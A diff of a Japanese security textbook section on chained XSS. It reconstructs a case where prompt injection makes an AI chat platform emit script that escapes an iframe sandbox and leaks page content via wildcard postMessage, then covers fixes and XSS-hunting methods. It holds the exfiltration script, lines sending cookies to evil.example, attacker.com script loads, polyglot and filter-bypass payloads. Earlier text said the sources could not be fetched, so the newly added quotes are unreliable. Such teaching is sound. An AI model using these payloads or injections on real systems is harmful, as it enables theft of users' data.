@@ -1,6 +1,6 @@
 ## 複合連鎖と実務的な発見手法
 
-これまでの章では、反射型・格納型・DOM-basedといった「単体のXSS」を扱ってきた。しかし実際のバグバウンティやレッドチーム演習で最も高額な報奨や最も深刻なインパクトを生むのは、**単体では中程度の重大度にしかならない複数の弱点を鎖のようにつなぐ（chain）ことで、初めてXSSやデータ漏洩に到達するケース**である。本節では、(1) `postMessage` の誤設定・AIプロンプトインジェクション・サンドボックス脱出を組み合わせた最近の実例、(2) 熟練した研究者がXSSを「どうやって見つけているか」という実務的な方法論、の2つを軸に解説する。
+これまでの章では、反射型・格納型・DOM-basedといった「単体のXSS」を扱ってきた。しかし実際のバグバウンティやレッドチーム演習で最も高額な報奨や最も深刻なインパクトを生むのは、**単体では中程度の重大度にしかならない複数の弱点を鎖のようにつなぐ（chain）ことで、初めてXSSやデータ漏洩に到達するケース**である。本節では、(1) `postMessage` の誤設定・AIプロンプトインジェクション・サンドボックス脱出を組み合わせた実例、(2) 熟練した研究者がXSSを「どうやって見つけているか」という実務的な方法論、の2つを軸に解説する。
 
 ### 6.4.1 なぜ「連鎖」が重要なのか
 
@@ -14,7 +14,9 @@
 
 ### 6.4.2 postMessage誤設定 × AIプロンプトインジェクション × サンドボックス脱出
 
-#### 背景: postMessageとサンドボックスの基本
+以下は、研究者 Source_To_Sink 氏が2026年3月にInfoSec Write-upsへ投稿した実例（対象はAIチャット/ドキュメント処理を行うプラットフォーム。企業名・URLは記事内で `[REDACTED]` 表記）を、原文の構造に沿って再構成したものである。単発の脆弱性としては「中程度」にしか評価されない3つの弱点——**postMessageの誤設定**、**AIプロンプトインジェクション**、**サンドボックス脱出**——を組み合わせることで、任意のJavaScript実行と機微データの持続的な持ち出し（exfiltration）にまで到達している。
+
+#### 背景: postMessageとサンドボックスの基本原理
 
 `window.postMessage()` は、異なるオリジン（プロトコル・ホスト・ポートの組が異なるページ）間で安全にメッセージをやり取りするためのAPIである。受信側は次のように実装するのが正しい。
 
@@ -25,152 +27,219 @@ window.addEventListener('message', (event) => {
 });
 ```
 
-ここで `event.origin` の検証を怠る、あるいは `*`（任意オリジン）で `postMessage` を送信していると、**どのオリジインの誰からでもメッセージを受け取れる／送りつけられる**状態になる。これが「postMessage誤設定」の核心である。原理的には、`message` イベントリスナーはブラウザにとって単なる公開エンドポイントであり、`event.origin` を確認しないコードは「誰でも呼び出せる関数」を晒しているのと同義になる——本節が参照する実例記事はこの点を「すべてのpostMessageハンドラは公開APIエンドポイントとして扱い、呼び出し元の検証・入力のサニタイズ・出力の制限を行うべきだ」と表現している。
+`event.origin` の検証を怠る、あるいは送信側が `*`（任意オリジン）を指定して `postMessage` を送っていると、**どのオリジンの誰からでもメッセージを受け取れる／送りつけられる**状態になる。原文はこの問題を次のように定式化している。
 
-一方、`<iframe sandbox>` 属性は、埋め込んだコンテンツの権限を制限する仕組みである。例えば次のように書くと、スクリプト実行やフォーム送信、同一オリジン権限の一部を無効化できる。
+> "If a sandboxed iframe uses postMessage("*") and accepts messages without origin validation, the sandbox provides a false sense of security" — 「サンドボックス化されたiframeが `postMessage("*")` を使い、origin検証なしにメッセージを受け付けているなら、サンドボックスは（実際には機能しない）安心感を与えているに過ぎない」
+
+つまり `message` イベントリスナーは、ブラウザから見れば単なる公開エンドポイントである。origin検証をしないコードは、認証なしで誰でも叩ける公開APIを晒しているのと本質的に同じであり、記事はここから「**すべてのpostMessageハンドラは公開APIエンドポイントとして扱い、呼び出し元の検証・入力のサニタイズ・出力の制限を行うべきだ**」と結論づけている。
+
+一方、`<iframe sandbox>` 属性は、埋め込んだコンテンツの権限を制限する仕組みである。
 
 ```html
 <iframe src="untrusted.html" sandbox="allow-scripts"></iframe>
 ```
 
-重要なのは、`sandbox` 属性に `allow-same-origin` を**含めない**場合、そのiframeのオリジンは強制的に `null`（一意のopaque origin）になるという仕組みである。これは一見安全に見えるが、逆に「origin検証をすり抜ける」トリックとして悪用できる場合がある。具体的には、`allow-same-origin` を外した厳格なサンドボックスiframeを作り、その `srcdoc` の中からさらに脆弱ページへ向けて `window.open()` した子ウィンドウを操作すると、通常のorigin文字列比較が期待通りに機能しない、あるいは検証ロジックが `null` origin を特別扱いしてしまっているケースで、比較をバイパスできることがある。この技法は「Bypassing SOP (Same-Origin Policy) with Iframes」として知られ、HackTricksなどのペンテスト資料に体系的にまとめられている。
+ここで注意すべき原理がある。`sandbox="allow-scripts"` は**スクリプトの実行そのものは許可**しており、`postMessage` による通信も制限しない。サンドボックスが制限するのは、主にCookie／ストレージへのアクセスや同一オリジン権限、トップレベルナビゲーションといった別の権限である。したがって「sandbox属性さえ付けておけば、中で動くコードは無害だ」という前提は誤りであり、記事はこのギャップ（sandboxが保護するものと保護しないものの乖離）こそが脆弱性チェーンの土台になっていると指摘する。
 
-#### AIプロンプトインジェクションが連鎖に組み込まれる仕組み
+#### ステップ1: AIプロンプトインジェクションでサンドボックス側の実行を仕込む
 
-近年、チャットボットやAIアシスタントをiframeやサンドボックス化されたWeb Worker的な環境に埋め込み、ユーザー入力やツール実行結果を `postMessage` 経由でホストページとやり取りさせるアーキテクチャが急増している。この構成では、AIモデルの出力（AIが生成したテキストやHTML）がそのまま `postMessage` のペイロードとしてホスト側に渡されることがある。
+このプラットフォームは、ユーザーがURLのクエリパラメータ `q` に入力を渡すと、その文字列がチャット欄に自動入力され、AIがそれに応答してHTMLを生成する構造になっていた。
 
-ここで**プロンプトインジェクション**（AIへの入力に、本来のタスク指示を上書き・逸脱させる文字列を混入させる攻撃）を使うと、攻撃者は「AIに特定のHTML/JSを含む応答を生成させる」ことができる。もしホスト側のpostMessageハンドラがAIの応答をそのまま `innerHTML` などの**sink**（入力が最終的に実行・解釈される危険な代入先。例: `innerHTML`、`eval`、`document.write`）に流し込んでいれば、AIの出力を経由してXSSペイロードを注入できることになる。
+```
+https://[REDACTED].com/chat?q=I%20am%20interested%20in%20apples%20make%20me%20a%20web%20page%20in%20html...
+```
 
-> ⚠️ **未取得の資料に基づく注記**: 元記事 “PostMessage Misconfiguration + AI Prompt Injection + Sandbox Escape = XSS & Data Exfiltration”（infosecwriteups.com）は、本環境のネットワーク制限により本文の直接取得ができませんでした（理由: プロキシによるドメインブロック）。以下のURLからユーザーご自身で直接ご覧ください: https://infosecwriteups.com/postmessage-misconfiguration-ai-prompt-injection-sandbox-escape-xss-data-exfiltration-d1d29821a2de
->
-> （以下は未取得資料の補足として、公開されている検索結果の断片と一般知識に基づく解説です。）
-
-検索で得られた情報によれば、この記事は「個別には中重要度に過ぎない3つの問題——postMessage誤設定、AIプロンプトインジェクション、サンドボックス脱出——を組み合わせることで、AIアシスタントプラットフォーム全体を侵害できた」という趣旨のケーススタディである。攻撃の骨格は次のように再構成できる。
-
-1. AIアシスタントのUIが、実行結果や生成コンテンツをサンドボックス化されたiframe内でレンダリングする。
-2. iframeとホストページの通信は `postMessage` で行われるが、受信側が `event.origin` を検証していない、または `*` で無差別に送受信している。
-3. 攻撃者はプロンプトインジェクションによって、AIに「悪意あるHTML/JSを含む応答」を生成させる。あるいは、攻撃者が用意した外部ページから直接偽装した `postMessage` を送りつける。
-4. サンドボックス（iframeのsandbox属性、あるいはAIの実行制限）は本来ここで悪意あるコードの実行や外部通信を防ぐはずだが、`window.name` の永続性（別ページに遷移してもプロパティが保持される特性）やフレーム階層のトラバーサル（`window.parent`、`window.top` を辿って上位フレームのDOMやトークンにアクセスする）を使って脱出（sandbox escape）される。
-5. 脱出後、DOM上のsinkに注入されたペイロードがブラウザに解釈され、XSSとして実行される。実行されたスクリプトは `fetch()` や `navigator.sendBeacon()` などで、セッショントークンやAPIキー、会話履歴といった機微情報を攻撃者サーバへ送信する（データ漏洩）。
-
-記事が実務者へ向けた教訓として強調しているのは、**「postMessageの誤設定を見つけたら、それ単体で終わらせず、他の弱点と組み合わせられないか常に探すべきだ」**という視点である。具体的に挙げられている連鎖候補は次の3つである。
-
-- AIプラットフォームにおけるプロンプトインジェクションとの組み合わせ
-- `window.name` の永続性を利用したクロスウィンドウでの標的化（あるページで `window.name` にペイロードを仕込み、被害者が別のオリジンのページに遷移した後もその値を読み出す手法）
-- フレーム階層トラバーサルによるスコープ拡大（`window.top`/`window.parent` を辿って、本来到達できないはずの上位・兄弟フレームのコンテキストに影響を及ぼす）
-
-> 出典: PostMessage Misconfiguration + AI Prompt Injection + Sandbox Escape = XSS & Data Exfiltration — https://infosecwriteups.com/postmessage-misconfiguration-ai-prompt-injection-sandbox-escape-xss-data-exfiltration-d1d29821a2de
-
-#### サンドボックス脱出の典型パターン（一般知識による補足）
-
-上記の連鎖をより具体的にイメージするため、postMessageとiframe sandboxを絡めた既知の攻撃パターンをコード例で示す。
-
-**パターン1: origin未検証のpostMessageハンドラへのHTMLインジェクション**
+この `q` パラメータの中に、AIへの本来の指示を上書きするような文字列（**プロンプトインジェクション**。AIへの入力に、本来の指示を逸脱させる文字列を混入させ、意図しない出力を引き出す攻撃）を混ぜ込むことで、攻撃者は「AIに特定のHTML/JSを含む応答を確実に生成させる」ことができる。生成されたHTMLは、サンドボックス化されたiframe内でレンダリングされる仕様になっていた。攻撃者はここへ、iframe内で実行させたい悪意あるスクリプトを注入する。
 
 ```js
-// 脆弱なホスト側コード
-window.addEventListener('message', (event) => {
-  // event.origin のチェックがない
-  document.getElementById('preview').innerHTML = event.data.html;
+let scriptContent = `
+  window.parent.postMessage({"type":"itworked"}, "*");
+  setInterval(() => {
+    for (let i = 0; i < window.parent.opener.frames.length; i++) {
+      let documentBody = window.parent.opener.frames[i].document.body.innerHTML;
+      if (typeof documentBody === "string") {
+        window.parent.postMessage({"type":"docbody","body":documentBody}, "*");
+      }
+    }
+  }, 1000);
+`;
+```
+
+なぜこれが「XSS」として成立するか。プロンプトインジェクションによってAIに生成させたこの文字列が、サンドボックス化されたiframeのコンテキストで実行される時点で、**攻撃者が自由に組み立てた任意のJavaScriptが、被害者のブラウザ上で動いている**ことになる。これはsandbox属性が防ぐはずの「未検証コンテンツの実行」そのものであり、AIの出力をレンダリング用のsink（`innerHTML`や新規iframeの`srcdoc`など、文字列が最終的にコードやHTMLとして解釈される代入先）にそのまま流し込む設計になっていたことが根本原因である。
+
+#### ステップ2: window.name永続化によるサンドボックス脱出
+
+問題は、このスクリプトが「サンドボックス化されたiframeの中」でしか動いていないという点である。サンドボックスの中だけであれば、被害範囲はそのiframe自身のDOMに限られるはずだった。ここで使われたのが、ブラウザの**`window.name`永続化**という古典的な性質である。
+
+`window.name` はウィンドウ（タブ）に紐づく文字列プロパティで、**そのウィンドウが別のオリジンへナビゲート（遷移）しても値が保持される**という、後方互換性のために維持されてきた挙動を持つ。原文はこれを次のように説明している。
+
+> "window.name persists across navigations, and browsers maintain this behavior for backward compatibility" — 「`window.name`はページ遷移をまたいで保持され、ブラウザはこの挙動を後方互換性のために維持している」
+
+攻撃者はこの性質を利用し、複数のウィンドウ間でのオリジンをまたいだ参照関係を構築する。攻撃フローは次の通りである。
+
+1. **ウィンドウA**（攻撃者ページ、`first.html`）: 事前に `window.name = "Baymax"` を設定しておく。
+2. ウィンドウA上の「Loginボタン」のようなUI要素をユーザーにクリックさせ、`second.html` を開く（**ウィンドウB**）。
+3. ウィンドウB内で `window.open("https://[REDACTED].com/chat?q=...", "Baymax")` を実行する。第2引数にウィンドウ名 `"Baymax"` を指定して `window.open()` を呼ぶと、ブラウザは**同じ名前を持つ既存のウィンドウ（ここではウィンドウA）を再利用してそこへナビゲートする**という仕様がある。これによりウィンドウAは被害者のプラットフォームのチャットページへ強制的に遷移させられるが、`window.name` の値 `"Baymax"` 自体は保持されたままになる。
+4. ウィンドウAは今やターゲットプラットフォームのページであり、その中にステップ1で仕込んだプロンプトインジェクション経由のAI応答が読み込まれ、サンドボックスiframe（0番目のフレームなど）としてレンダリングされる。
+5. ウィンドウBは `window.opener` （自分を開いた元のウィンドウへの参照）経由でウィンドウAにアクセスできる。すなわち `window.opener.frames[0]` のようにして、**別オリジンであるはずのターゲットページ内のサンドボックスiframeへの参照を、攻撃者が完全に制御するウィンドウBから直接手繰り寄せられる**ことになる。
+
+この一連の流れが成立する理由は、`window.name` の永続化、`window.open()` の名前付きウィンドウ再利用、そして `window.opener`/`frames` によるフレーム階層トラバーサル（`window.parent`・`window.top`・`window.opener`・`frames` を辿って、本来は直接アクセスできないはずの別のウィンドウ／フレームの参照を得る操作）という、いずれも仕様上正当なブラウザ機能を**組み合わせて使う**ことで、サンドボックスの権限境界を実質的に迂回している点にある。サンドボックス属性そのものにバグがあるわけではなく、「サンドボックスの外側にある、ブラウザの正規のクロスウィンドウ機構」を踏み台にしているのが本質である。
+
+#### ステップ3: origin未検証のpostMessageによるデータ持ち出し
+
+サンドボックス内で実行されているスクリプト（ステップ1のペイロード）は、1秒ごとに `window.parent.opener.frames[i].document.body.innerHTML` を読み取り、`postMessage({"type":"docbody","body":documentBody}, "*")` として送信し続ける。受信側（攻撃者が用意したページ、あるいは前述のウィンドウA/B）がこの `message` イベントをリッスンしていれば、送信元のorigin検証がない限りメッセージを受理してしまう。
+
+```js
+// 送信側: ワイルドカードOriginを使用
+window.parent.postMessage({ type: "docbody", body: htmlBody }, "*");
+
+// 受信側: Origin検証がない
+window.addEventListener("message", (event) => {
+  if (event.data.type === "start-received") {
+    renderContent(event.data.input, event.data.language);
+  }
 });
 ```
 
+第二引数に `"*"` を指定して送信すると、**そのメッセージはどのオリジンで動いているリスナーにも届いてしまう**（送信側のorigin制限）。加えて受信側も `event.origin` を確認していないため（受信側のorigin検証欠落）、この2つが揃うことで、攻撃者が完全に制御するページが、被害者のブラウザ内で継続的に生成される機微情報（アップロードされたドキュメントの内容、AIの生成レスポンス、会話履歴など）を**リアルタイムで盗聴し続けられる**状態が成立する。`setInterval` によって1秒ごとにポーリングしているため、被害者がページを開いている間、情報漏洩は持続的に発生する。
+
+#### なぜ「サンドボックスがあるから安全」という前提が崩れるのか
+
+原文が強調しているのは、`sandbox` 属性が保護する範囲と、この攻撃チェーンが突いた範囲がそもそも一致していないという点である。`sandbox="allow-scripts"` はスクリプト実行そのものは止めず、`postMessage` 通信も制限しない。加えて `window.opener` 経由の参照は、`sandbox` 属性の制約とは別の仕組み（ウィンドウ間の開設者参照）であるため、サンドボックス設定だけでは塞げない。これが「個別には中程度の3つの弱点が、鎖として繋がると重大なインパクトになる」理由である。
+
+#### 修正方法
+
+**Fix 1: origin検証を許可リストとの厳密一致で行う**
+
 ```js
-// 攻撃者が用意した別オリジンのページから
-const target = document.getElementById('victim-iframe').contentWindow;
-target.postMessage(
-  { html: '<img src=x onerror="fetch(\'https://evil.example/steal?c=\'+document.cookie)">' },
-  '*'
-);
+const ALLOWED_ORIGINS = [
+  "https://[REDACTED].com",
+  "https://www.[REDACTED].com"
+];
+window.addEventListener("message", function(event) {
+  if (!ALLOWED_ORIGINS.includes(event.origin)) {
+    console.warn("Rejected message from unauthorized origin:", event.origin);
+    return;
+  }
+  // 処理続行
+});
 ```
 
-なぜ動くか: 受信側が `event.origin` を確認せず、かつ受け取ったデータをそのまま `innerHTML`（sink）に代入しているため、ブラウザは埋め込まれた `<img onerror=...>` を通常のHTMLとしてパースし、`onerror` ハンドラ内のJavaScriptを実行してしまう。
+**Fix 2: 受け取ったHTMLは必ず無害化する**
 
-**パターン2: サンドボックスiframeを踏み台にしたorigin偽装**
-
-```html
-<!-- 攻撃者ページ内、strictなsandbox(=allow-same-originなし)のiframe -->
-<iframe sandbox="allow-scripts allow-popups" srcdoc="
-  <script>
-    // このiframe自体のoriginは強制的に null になる
-    var w = window.open('https://victim.example/vulnerable-receiver');
-    setTimeout(function(){
-      w.postMessage('<iframe srcdoc=\"<script src=//evil.example/x.js></script>\"></iframe>', '*');
-    }, 1000);
-  </script>
-"></iframe>
+```js
+const sanitized = DOMPurify.sanitize(content, {
+  FORBID_TAGS: ['script', 'iframe', 'object', 'embed'],
+  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover']
+});
 ```
 
-なぜ動くか: `allow-same-origin` を含めないsandbox属性は、iframe内のスクリプトの実行オリジンを一意な `null` origin にする。この状態から新しいウィンドウを開いて被害ページへ `postMessage` を送ると、受信側の検証ロジックが「送信元origin文字列」を単純比較や部分一致でしか見ていない場合（例えば `event.origin.includes('victim.example')` のような緩い判定、あるいはそもそも判定していない場合）に、意図せずメッセージを受理してしまう。これは「サンドボックスが安全性を保証しない」ことを示す典型例であり、`sandbox` 属性は**あくまでiframe内のコンテンツの権限を絞るものであって、postMessageの送信元検証を代替するものではない**という原理を理解しておく必要がある。
+**Fix 3: `postMessage` の送信先は必ず明示のオリジンにする**
 
-#### 防御策
+```js
+iframe.contentWindow.postMessage(data, "https://cdn.example.cloudfront.net");
+```
 
-- **origin検証を必ず行う**: `event.origin` を許可リストと厳密一致（`===`）で比較する。部分一致・正規表現の誤用（例: `event.origin.endsWith('.example.com')` が `evilexample.com` にもマッチしてしまう等）に注意する。
-- **`postMessage` の送信先も明示する**: `postMessage(data, '*')` ではなく、想定する受信オリジンを第二引数に明示する。
-- **受信データを信頼しない**: postMessageで受け取ったデータをそのままDOM sink（`innerHTML`、`document.write`、`eval`）に渡さない。必ずスキーマ検証・エスケープを行う。
-- **AI生成コンテンツはさらに厳格に扱う**: AIモデルの出力はユーザー入力と同様、あるいはそれ以上に信頼できない外部入力として扱い、レンダリング前に許可されたタグ・属性のみを通すサニタイズ（例: DOMPurifyのようなライブラリでのホワイトリスト方式）を行う。
-- **sandbox属性の限界を理解する**: `allow-same-origin` を外していても、`window.open` やクロスウィンドウ通信を通じた迂回経路が残ることを前提に、CSPの `frame-ancestors` やCOOP/COEPなど多層防御を組み合わせる。
+`"*"` を使わず送信先オリジンを固定すれば、意図しないオリジンにメッセージが漏れることはなくなる。
+
+**Fix 4: `window.name` を悪用したクロスウィンドウ攻撃への対策**
+
+```js
+// Cross-Origin-Opener-Policy: same-origin ヘッダーが最も効果的
+if (window.name) {
+  window.name = "";
+}
+```
+
+`Cross-Origin-Opener-Policy: same-origin` を送出すると、クロスオリジンのウィンドウ間で `window.opener` 参照自体が切り離されるため、ステップ2で示したフレーム階層トラバーサルの起点を断つことができる。ページ側で不要な `window.name` を明示的にクリアすることも補助的な対策になる。
+
+#### 実務者への教訓
+
+記事が繰り返し強調しているのは、**単体の弱点を見つけて終わりにしない**という視点である。原文の結論を要約すると次のようになる。
+
+- postMessage誤設定（origin検証欠落）を見つけたら、それ単体のバグとして報告するだけでなく、AIプラットフォームであればプロンプトインジェクションと、iframeがあればサンドボックス脱出の可能性と、組み合わせられないかを必ず検討する。
+- `window.name` の永続性は、あるページで値を仕込んでおき、被害者が全く別のオリジンへ遷移した後もその値を読み出せるという、クロスウィンドウでの標的化に使える古典的だが見落とされやすい手法である。
+- `window.top`・`window.parent`・`window.opener` を辿るフレーム階層トラバーサルは、本来到達できないはずの上位・関連フレームのコンテキストへスコープを拡大する定石であり、postMessageの検証漏れと組み合わせると威力が増す。
+- 「個別には中程度の脆弱性が、連鎖することで重大な侵害を実現する」——バグバウンティのトリアージにおいても、単一issueのCVSSだけでなく、他の既知の弱点との組み合わせ可能性を評価する視点が要求される。
+
+> 出典: PostMessage Misconfiguration + AI Prompt Injection + Sandbox Escape = XSS & Data Exfiltration（Source_To_Sink, InfoSec Write-ups, 2026年3月） — https://infosecwriteups.com/postmessage-misconfiguration-ai-prompt-injection-sandbox-escape-xss-data-exfiltration-d1d29821a2de
 
 ### 6.4.3 実務者はどうやってXSSを見つけているか
 
-続いて、単発の脆弱性探しの「型」に話を移す。ここではHackerOneが公開した実務者向けガイドの要点を紹介する。
+続いて、単発の脆弱性探しの「型」に話を移す。ここではHackerOneが2026年4月に公開した実務者向けガイド（著者: Haoxi Tan, Security Researcher）の要点を紹介する。
 
-> ⚠️ **未取得の資料**: 「How to Find XSS Vulnerabilities: Practical Security Guide」（HackerOne Blog）は自動取得できませんでした（理由: プロキシによるドメインブロック）。以下のURLからユーザーご自身で直接ご覧ください: https://www.hackerone.com/blog/how-find-xss-techniques-security-researchers-use-real-environments
->
-> （以下は未取得資料の補足として、公開されている検索結果の断片と一般知識に基づく解説です。）
-
-検索結果から確認できた記事の骨子は、XSSを「反射型・格納型・DOM-based」という基本3分類に加えて、**ブラインドXSS（Blind XSS, bXSS）**や**サーバサイドXSS**といった、実務で頻出する特殊系統を押さえるべきだという点、そして発見のための具体的な手法として次の3つを挙げている。
+記事はまず、Cross-Site Scripting（XSS）を「被害者のブラウザ上で任意のJavaScriptを実行させる、Webアプリケーションで一般的な脆弱性の一種」と定義した上で、反射型・格納型・DOM-basedという基本3分類に加えて、**ブラインドXSS（Blind XSS, bXSS）**や、PDF・Electronアプリのような「異例の場所」に現れるXSSも実務では頻出すると指摘し、発見のための具体的な手法とツールを提示している。
 
 #### (1) ポリグロットペイロードによる網羅的プロービング
 
-**ポリグロット（polyglot）**とは、複数の異なるコンテキスト（HTML属性内、JS文字列内、URL内など）のいずれに挿入されても実行が成立するように設計された、汎用性の高いペイロードを指す。実務では、入力がどのコンテキストに出力されるか事前に分からないことが多いため、まずポリグロットを投入して「そもそも何らかの形でXSSが成立しそうか」を素早く判定し、その後コンテキストを絞った個別ペイロードで確定させる、という二段階のアプローチが取られる。代表的なポリグロットの一つは次のような構造を持つ。
+**ポリグロット（polyglot）**とは、複数の異なるコンテキスト（HTML属性内、JS文字列内、URL内など）のいずれに挿入されても実行が成立するように設計された、汎用性の高いペイロードを指す。記事が挙げる例は次のようなものである。
 
 ```
-javascript:/*--></title></style></textarea></script></xmp>
-<svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
 ```
 
-なぜ動くか: このペイロードは `</title>` `</style>` `</textarea>` `</script>` `</xmp>` といった複数の終了タグ候補を並べることで、挿入先が「どのタグの内側」であっても、まずそのタグを閉じてHTML本文コンテキストに脱出することを狙っている。脱出に成功すれば、後続の `<svg/onload=...>` がブラウザのHTMLパーサに新規要素として解釈され、`onload` イベントハンドラ内のJSが実行される。1つのペイロードで複数コンテキストへの対応を試みる「保険を重ねる」設計になっている点が本質である。
+なぜ動くか。この文字列は「属性値の終端 `"`」「HTMLタグの新規開始 `<button ...>`」「別の引用符パターン `'`」「JSコメントアウト `//`」「ブロックコメント `*/`」といった、複数の異なる構文コンテキストへの脱出手段を1つの文字列の中に並置している。挿入先が属性値の中であれ、JS文字列リテラルの中であれ、コメントの直後であれ、いずれかの断片がその文脈にマッチしてコンテキストから脱出し、`onclick=alert(1)` や `alert(1)` が実行可能な位置に着地する。実務では、入力がどのコンテキストに出力されるか事前に分からないことが多いため、まずポリグロットを投入して「そもそも何らかの形でXSSが成立しそうか」を素早く判定し、その後コンテキストを絞った個別ペイロードで確定させる、という二段階のアプローチが取られる。記事は具体的なペイロード集として **PayloadsAllTheThings**（GitHubのXSS Injectionセクション）、**HackTricks**のXSS解説、そして自動テスト用の **Auto_Wordlists** を挙げている。
 
-大規模なペイロード集としては `PayloadsAllTheThings` の XSS Injection セクションのようなキュレーションされたリストが実務で広く使われており、パラメータごとに機械的に多数のバリエーションを試す「ファジング的アプローチ」がとられる。
+#### (2) 自動化ツールと手動テストの使い分け
 
-#### (2) フィルタバイパスによる格納型XSSの深掘り
+記事は自動化ツールとして **Dalfox**（反射型・蓄積型XSSの両方に対応）、**XSStrike**（反射型専用）、そしてブラインドXSS検出用のコールバックプラットフォームである **xsshunter** を紹介しつつ、次のように限界を明言している。
 
-Markdown入力や掲示板の独自記法など、「自由形式のHTMLを一部だけ許可する」機能は、実装者がブラックリスト方式でタグ・属性を除去しようとしがちであり、フィルタの実装の隙を突く**フィルタバイパス**が有効な攻撃面になる。典型的な原理は、パーサの解釈順序とフィルタのマッチング順序のズレを突くというものである。例えば、フィルタが `<script>` という文字列だけを機械的に除去する実装だと、次のような入力で回避できる。
+> "automated tools for finding anything beyond low-hanging reflected XSS are limited" — 「低難度の反射型XSSを超える範囲を見つけるための自動化ツールは限定的である」
 
-```
-<scr<script>ipt>alert(1)</scr</script>ipt>
-```
+つまり、自動スキャナは「入力をそのまま出力に反映する」ような単純な反射型XSSの検出には有効だが、フィルタバイパスや複雑なDOMの再解釈が絡む深い脆弱性の発見には手動テストが不可欠だという実務的な位置づけを示している。
 
-なぜ動くか: フィルタが `<script>` という文字列を一度だけ除去すると、除去後に残った断片同士がテキスト上で結合し、結果として `<script>alert(1)</script>` という有効なタグが再構成される。これは**パーサ再解釈**（除去や置換といった文字列処理を1パスだけ行うフィルタが、処理後の文字列が再度HTMLパーサにかけられることを想定していないために起こる）の典型例であり、ブラックリスト方式のサニタイズが原理的に脆いことを示す好例である。
+#### (3) 反射型XSS(RXSS)の典型的な発見箇所
 
-#### (3) ブラインドXSS(bXSS)による「見えない」実行面の発見
+記事が挙げる発見場所は、URLパラメータ（検索クエリ、エラーメッセージの表示欄）、リダイレクトパラメータ（ログイン後のPOSTリダイレクトに使われる `returnTo` のようなパラメータ）、そして `javascript:` プロトコルを含む特殊なURLである。具体例として、Shopifyの `returnTo` パラメータで発見された事例が紹介されている。
 
-ブラインドXSSは、格納型XSSの一種でありながら、**攻撃者自身がペイロードの実行結果を直接観測できない**点が特徴である。典型的には、問い合わせフォームやサポートチケット、ユーザー名、User-Agentヘッダーなど、一般ユーザーの画面には表示されないが、後日カスタマーサポートや管理者が管理画面で閲覧するデータにペイロードを仕込む。管理者がその画面を開いた瞬間にペイロードが実行され、攻撃者が管理する外部サーバへコールバックが送られる、という仕組みである。
+#### (4) 格納型XSSとMarkdown/Mutation XSSへの注意
+
+格納型XSS（蓄積型XSS）の典型的な発見箇所は、コメント欄、ユーザープロフィールデータ、プライベートメッセージ、メール機能である。記事は特に「Markdownテキストの HTML への変換」や「不正なHTML構文をブラウザが自動修正する過程」で発生する**Mutation XSS（mXSS）**に注意を促し、GitLabのウィキ機能での事例を挙げている。これは第6章の別節で扱ったMailspringの事例と同じ、サニタイザとレンダラのパース差分という原理に基づくものである。
+
+#### (5) ブラインドXSS(bXSS)による「見えない」実行面の発見
+
+ブラインドXSSは、ペイロードの実行結果を攻撃者自身が直接観測できない点が特徴の格納型XSSである。記事が挙げる典型的な標的は、HTTPヘッダー（User-Agent、Cookie）、アカウント登録フォーム、フィードバック機能、ユーザー名・メールアドレス欄である。ペイロードは通常のサニタイズ漏れと同じ形で仕込まれるが、実行される場所とタイミングを攻撃者が事前に知り得ないため、**xsshunter**のような外部コールバックエンドポイントを使い、どのフォームに仕込んだペイロードが、いつ、どの管理画面で発火したかを追跡する運用が必要になる。管理者権限を持つバックオフィス画面で発火することが多いため、単純な反射型XSSより被害範囲が大きくなりやすい。
+
+#### (6) DOM型XSSの検出: Burp Suite DOM Invader
+
+DOM-basedXSSの検出について、記事は **Burp Suite の DOM Invader**（source/sinkの流れを解析するBurp Suiteの拡張機能）を明示的に推奨している。手順は次の通りである。
+
+1. DOM Invaderで「キャナリ」（追跡用のユニークな文字列）を生成する。
+2. テスト対象のフィールドにそのキャナリを挿入する。
+3. DOM Invaderがキャナリの流れを追跡し、どのsink（出力先）に到達したかを自動検出する。
+4. 検出されたsinkの種類に応じてペイロードを調整し、実際にエクスプロイトを組み立てる。
+
+実例として、Gin and Juice Shop（PortSwiggerが公開する練習用の脆弱アプリケーション）で、`<img src>` 属性経由で `onload` ペイロードを挿入した事例が紹介されている。
+
+#### (7) 異例の場所でのXSS: PDFとElectronアプリ
+
+記事はXSSが「Webブラウザの中だけの脆弱性」ではないことも強調している。
+
+**PDFにおけるXSS**は、サーバーサイドでPDFを生成・処理する機能に対して行われ、SSRF（Server-Side Request Forgery）やLFI（Local File Inclusion）へと連鎖しうる。テスト例として次が挙げられている。
 
 ```html
-<script src="https://attacker-controlled.example/bxss.js"></script>
+<img src="x" onerror="document.write('test')" />
+<script src="http://attacker.com/myscripts.js"></script>
 ```
 
-なぜ動くか: このペイロードそのものは特別なテクニックを使っておらず、通常の格納型XSSと同じくエスケープ漏れのあるsinkに挿入されている。異なるのは**実行される場所とタイミングを攻撃者が把握できない**という運用上の特性であり、そのため専用のツール（外部コールバックを検知するプラットフォーム）を使い、どのフォームに仕込んだペイロードがいつ・どの管理画面で発火したかを追跡する運用が必要になる。管理者権限の高いバックエンドで発火するため、単純な反射型XSSよりも被害範囲が大きくなりやすい。
+このようなペイロードをPDF生成に使われる入力（HTMLをPDF化するライブラリへの入力など）に混入させ、生成側のレンダリングエンジンでJavaScriptが実行されるかを確認する。記事はSlackでこの種の脆弱性が報告され、約5,000ドルの報奨金が支払われた例を紹介している。
 
-#### 実務的な発見の流れ（まとめ）
+**Electronアプリケーション**については、検出ツールとして **Electronegativity**（Electronアプリのセキュリティ設定を静的解析するツール）が挙げられている。確認すべきリスク要因は `nodeIntegration: true` の設定であり、これが有効な状態でXSSが成立すると、`require('child_process').exec()` のような呼び出しを通じてXSSがRCE（Remote Code Execution）にエスカレーションしうる。記事はRocket ChatデスクトップアプリのMarkdownパーサーに存在したXSSが、ローカルマシンでのコード実行にまで発展した事例を挙げている。これは前節で扱ったMailspringのmXSS→RCE連鎖と同じ原理（Electronの権限昇格）である。
 
-HackerOneのガイドが示す実務フローを整理すると、次のような段階を踏むことになる。
+#### 統計データと実務的示唆
 
-1. **入力点の洗い出し**: URLパラメータ、フォーム、HTTPヘッダー、ファイルアップロードのメタデータ、WebSocketメッセージなど、あらゆるユーザー制御可能な入力を列挙する。
-2. **反映点（sink）の特定**: その入力がどこに、どのコンテキスト（HTML本文・属性・JS文字列・URL・CSS）で出力されるかを確認する。
-3. **ポリグロットで広く当たりをつける**: コンテキストが不明な段階では汎用ペイロードで「何か起きるか」をまず確認する。
